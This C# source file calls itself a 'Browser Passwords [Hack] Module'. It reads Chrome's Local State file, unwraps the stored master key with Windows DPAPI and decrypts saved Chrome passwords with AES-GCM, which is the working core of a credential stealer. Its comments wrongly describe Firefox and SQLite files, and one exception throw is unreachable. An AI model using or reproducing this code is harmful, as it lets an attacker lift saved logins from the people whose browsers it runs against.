using System;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;

using Newtonsoft.Json;

using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;

namespace Mona
{
    /// <summary>
    /// Browser Passwords [Hack] Module
    /// Using SQLLite Connection to retrieve passwords from Firefox browser profiles.
    /// Sent to FFDecryptor to decrypt the passwords.
    /// Filename = "signons.sqlite" Filename="logins.json"
    /// </summary>
    public static class GCDecryptor
    {
        /// <summary>
        /// Browser Passwords [Hack] Module
        /// Using JSONConvertor to get passwords from Chrome Browser.
        /// GCDecryptor decrypts all passwords in same file.        
        /// </summary>
        public static byte[] GetKey()
        {
            try
            {
                string sR = string.Empty;
                var appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);// APPDATA
                var path = Path.GetFullPath(appdata + "\\..\\Local\\Google\\Chrome\\User Data\\Local State");

                string v = File.ReadAllText(path);

                dynamic json = JsonConvert.DeserializeObject(v);
                string key = json.os_crypt.encrypted_key;

                byte[] src = Convert.FromBase64String(key);
                byte[] encryptedKey = src.Skip(5).ToArray();

                byte[] decryptedKey = ProtectedData.Unprotect(encryptedKey, null, DataProtectionScope.CurrentUser);

                return decryptedKey;
            }
            catch(Exception ex)
            {
                throw new Exception(ex.Message);
            }
            
        }

        public static string Decrypt(byte[] encryptedBytes, byte[] key, byte[] iv)
        {
            var sR = string.Empty;
            try
            {
                var cipher = new GcmBlockCipher(new AesEngine());
                var parameters = new AeadParameters(new KeyParameter(key), 128, iv, null);

                cipher.Init(false, parameters);
                var plainBytes = new byte[cipher.GetOutputSize(encryptedBytes.Length)];
                var retLen = cipher.ProcessBytes(encryptedBytes, 0, encryptedBytes.Length, plainBytes, 0);
                cipher.DoFinal(plainBytes, retLen);

                sR = Encoding.UTF8.GetString(plainBytes).TrimEnd("\r\n\0".ToCharArray());
            }
            catch (Exception ex)
            {
                throw new Exception(ex.Message);
                throw new Exception(ex.StackTrace);
            }

            return sR;
        }

        public static void Prepare(byte[] encryptedData, out byte[] nonce, out byte[] ciphertextTag)
        {
            nonce = new byte[12];
            ciphertextTag = new byte[encryptedData.Length - 3 - nonce.Length];

            Array.Copy(encryptedData, 3, nonce, 0, nonce.Length);
            Array.Copy(encryptedData, 3 + nonce.Length, ciphertextTag, 0, ciphertextTag.Length);
        }
    }
}
